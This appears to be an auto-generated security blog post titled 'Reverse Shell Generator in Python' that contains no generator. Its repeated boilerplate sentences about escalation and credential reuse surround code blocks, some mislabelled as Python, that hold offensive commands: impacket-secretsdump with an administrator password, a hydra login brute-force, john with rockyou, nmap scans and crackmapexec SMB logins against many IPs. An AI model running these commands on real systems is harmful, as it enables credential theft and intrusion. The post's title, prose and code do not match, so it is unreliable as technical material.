---
TitleSEO: "Reverse Shell Generator in Python | ZureFX"
TitlePost: "Reverse Shell Generator — Python"
Author: "ZureFX"
Description: "A Python script for reverse shell generator. Built for security research and automation."
Keywords: "script, automation, parser, python"
URL: "https://zurefx.github.io/scripting/script-reverse-shell-generator-759.html"
URL_IMAGES: ""
Date: "2026-03-19"
Tags: "Script, Automation, Parser, Python"
Section: "scripting"
Lang: "en"
main_img: "script-reverse-shell-generator-759"
Permalink: "/scripting/script-reverse-shell-generator-759.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `chisel`
- `psexec`
- `crackmapexec`

## Implementation

### Core Logic

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.28.113.102
impacket-secretsdump administrator:'P@ssw0rd!'@10.38.30.66
```

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Helper Functions

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.120.49.141 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.79.240.11
nmap -sCV -p135,23,9200 10.106.196.211 -oN scan.txt
```

## Usage

### Basic Usage

Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
crackmapexec smb 10.53.208.44 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

```bash
crackmapexec smb 10.51.157.158 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.94.88.95 -u administrator -p 'P@ssw0rd!' --shares
crackmapexec smb 10.89.160.167 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

```
[+] Scanning target...
[+] Found 1 results
[+] Done in 26.04s
```
